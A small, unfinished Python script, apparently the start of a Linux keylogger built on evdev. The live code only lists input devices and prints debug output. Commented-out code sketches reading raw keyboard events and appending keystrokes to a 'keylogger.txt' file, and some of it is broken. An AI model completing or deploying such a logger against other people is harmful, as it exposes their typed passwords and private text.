#keyboard is in event0
#!/usr/bin/env python3

import evdev

class Logger:

    def __init__(self):
        # self.qwerty_map = {
        #     2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
        #     11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "a", 17: "z",
        #     18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "^",
        #     27: "$", 28: "\n", 29: "[CTRL]", 30: "q", 31: "s", 32: "d", 33: "f", 34: "g",
        #     35: "h", 36: "j", 37: "k", 38: "l", 39: "m", 40: "ù", 41: "*", 42: "[SHIFT]",
        #     43: "<", 44: "w", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: ",",
        #     51: ";", 52: ":", 53: "!", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
        # }# Source from: https://thehackerdiary.wordpress.com/tag/devinput-python/
        
        self.devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
        

    def log_input(self):
        for device in self.devices:
            print(device.path, device.name, device.phys)
        print("REEEE")
        print(self.devices)
        # print(infile_path)

        # FORMAT = 'llHHI'
        # EVENT_SIZE = struct.calcsize(FORMAT)

        # in_file = open(self.infile_path, "rb")

        # event = in_file.read(EVENT_SIZE)
        # typed = ""

        # while event:
        #     (_, _, type, code, value) = struct.unpack(FORMAT, event)

        #     with open("keylogger.txt", "a") as f:
        #         try:
        #             f.write('alphanumeric key {0} pressed'.format(qwerty_map[code]))
        #         except AttributeError:
        #             f.write('special key {0} pressed'.format(qwerty_map[code]))

        # in_file.close()

        # for event in infile_path.read_loop():
        #     if event.type == ecodes.EV_KEY:
        #         print(categorize(event))



if __name__ == "__main__":
    logger = Logger()
    logger.log_input()